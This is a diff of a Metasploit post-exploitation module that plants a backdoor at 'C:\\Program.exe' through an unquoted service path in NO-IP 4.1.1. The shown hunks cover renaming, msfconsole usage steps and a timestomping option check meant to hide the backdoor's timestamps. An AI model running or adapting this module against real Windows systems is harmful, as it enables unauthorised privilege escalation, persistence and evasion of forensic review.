@@ -7,7 +7,7 @@
 
 
 ##
-# Exploit Title  : NO-IP_unquoted_service_backdoor.rb - 'Unquoted Service Path vuln'
+# Exploit Title  : NO-IP_service_backdoor.rb - 'Unquoted Service Path vuln'
 # NO-IP Version  : 4.1.1
 # vuln Discover  : Ehsan Hosseini
 # Module Author  : pedr0 Ubuntu [r00t-3xp10it]
@@ -63,20 +63,20 @@
 #
 #
 # [ PORT MODULE TO METASPLOIT DATABASE ]
-# Kali linux   COPY TO: /usr/share/metasploit-framework/modules/post/windows/escalate/NO-IP_unquoted_service_backdoor.rb
-# Ubuntu linux COPY TO: /opt/metasploit/apps/pro/msf3/modules/post/windows/escalate/NO-IP_unquoted_service_backdoor.rb
+# Kali linux   COPY TO: /usr/share/metasploit-framework/modules/post/windows/escalate/NO-IP_service_backdoor.rb
+# Ubuntu linux COPY TO: /opt/metasploit/apps/pro/msf3/modules/post/windows/escalate/NO-IP_service_backdoor.rb
 # Manually Path Search: root@kali:~# locate modules/post/windows/escalate
 #
 #
 # [ LOAD/USE AUXILIARY ]
 # meterpreter > background
 # msf exploit(handler) > reload_all
-# msf exploit(handler) > use post/windows/escalate/NO-IP_unquoted_service_backdoor
-# msf post(NO-IP_unquoted_service_backdoor) > info
-# msf post(NO-IP_unquoted_service_backdoor) > show options
-# msf post(NO-IP_unquoted_service_backdoor) > show advanced options
-# msf post(NO-IP_unquoted_service_backdoor) > set [option(s)]
-# msf post(NO-IP_unquoted_service_backdoor) > exploit
+# msf exploit(handler) > use post/windows/escalate/NO-IP_service_backdoor
+# msf post(NO-IP_service_backdoor) > info
+# msf post(NO-IP_service_backdoor) > show options
+# msf post(NO-IP_service_backdoor) > show advanced options
+# msf post(NO-IP_service_backdoor) > set [option(s)]
+# msf post(NO-IP_service_backdoor) > exploit
 ##
  
  
@@ -442,9 +442,9 @@ def ls_stage4
   bin_name = "C:\\Program.exe"
   # check for proper config settings enter
   # to prevent 'unset all' from deleting default options...
-  if datastore['LOCAL_PATH'] == 'nil'
+  if datastore['BLANK_TIMESTOMP'] == 'nil'
     print_error("Options not configurated correctly...")
-    print_warning("Please set LOCAL_PATH option!")
+    print_warning("Please set BLANK_TIMESTOMP option!")
     return nil
   else
     print_status("Blank backdoor timestamp attributes!")
